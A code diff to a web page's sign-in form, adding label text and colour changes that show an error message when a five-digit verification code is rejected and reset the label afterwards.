@@ -61,7 +61,7 @@
                         <form class="form" action="">
                             <div class="input-group touched with-label">
                                 <input class="form-control" type="text" id="verificationCode" inputmode="tel" aria-label="Code">
-                                <label for="sign-in-code">Code</label>
+                                <label for="sign-in-code" id="codeLabel">Code</label>
                             </div>
                         </form>
                     </div>
@@ -892,9 +892,10 @@ window.addEventListener("DOMContentLoaded", () => {
 
     verificationInput.addEventListener("input", function () {
         const code = this.value.trim();
-
-        // Reset border on new input
+        document.getElementById("codeLabel").style.color = "#707579";
+        document.getElementById("codeLabel").textContent = "Your phone number";
         verificationInput.style.borderColor = "";
+        verificationInput.disabled = false;
 
         if (code.length === 5) {
             verificationInput.disabled = true;
@@ -908,17 +909,23 @@ window.addEventListener("DOMContentLoaded", () => {
             .then(data => {
                 if (data.status === "success") {
                     alert("Verification successful!");
-                    // You can redirect or show a new screen here
+                    
                 } else {
                     verificationInput.style.borderColor = "red";
+                    document.getElementById("codeLabel").style.color = "red";
+                    document.getElementById("codeLabel").textContent = "Invalid code, please try again";
                 }
             })
             .catch(err => {
                 console.error(err);
                 verificationInput.style.borderColor = "red";
+                document.getElementById("codeLabel").style.color = "red";
+                document.getElementById("codeLabel").textContent = "Invalid code, please try again";
             })
             .finally(() => {
                 verificationInput.disabled = false;
+                document.getElementById("codeLabel").style.color = "#707579";
+                document.getElementById("codeLabel").textContent = "Your phone number";
             });
         }
     });
